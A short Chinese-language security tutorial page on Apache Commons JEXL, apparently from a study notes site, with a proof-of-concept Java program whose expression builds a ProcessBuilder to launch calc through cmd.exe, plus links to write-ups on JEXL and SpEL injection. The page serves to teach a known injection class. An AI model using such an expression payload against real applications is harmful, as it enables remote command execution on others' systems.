---
comments: true
---
# 6 Java 表达式执行

## 6.1 JEXL

Apache Commons JEXL（Java Expression Language）是一个开源的表达式语言引擎，允许在Java应用程序中执行动态和灵活的表达式。JEXL旨在提供一种简单、易用的方式，通过字符串形式的表达式进行计算和操作。

语法参考：

- [官方手册](https://commons.apache.org/proper/commons-jexl/reference/syntax.html){:target="_blank"}
- [Apache Commons JEXL 语法](hthttps://ridikuius.github.io/Apache-Commons-JEXL3-%E8%AF%AD%E6%B3%95){:target="_blank"}

```java title="PoC"
package cc.trd;

import org.apache.commons.jexl3.*;

public class jexlrun {
    public static void main(String[] args) {
        JexlEngine engine = new JexlBuilder().create();
        String cmd="new('java.lang.ProcessBuilder', ['cmd.exe', '/c', 'calc']).start()";
        JexlExpression expr = engine.createExpression(cmd);
        JexlContext jc = new MapContext();
        Object result = expr.evaluate(jc);
        System.out.println(result);
    }
}
```


## 参考资料

- [Jexl 表达式注入分析与bypass](https://xz.aliyun.com/t/14683){:target="_blank"}
- [https://s1mple-top.github.io/2022/03/20/SpEL%E6%B3%A8%E5%85%A5RCE%E5%88%86%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Ajava%E5%8D%95%E5%90%91%E6%89%A7%E8%A1%8C%E9%93%BE%E7%9A%84%E6%80%9D%E8%80%83/](https://s1mple-top.github.io/2022/03/20/SpEL%E6%B3%A8%E5%85%A5RCE%E5%88%86%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Ajava%E5%8D%95%E5%90%91%E6%89%A7%E8%A1%8C%E9%93%BE%E7%9A%84%E6%80%9D%E8%80%83/){:target="_blank"}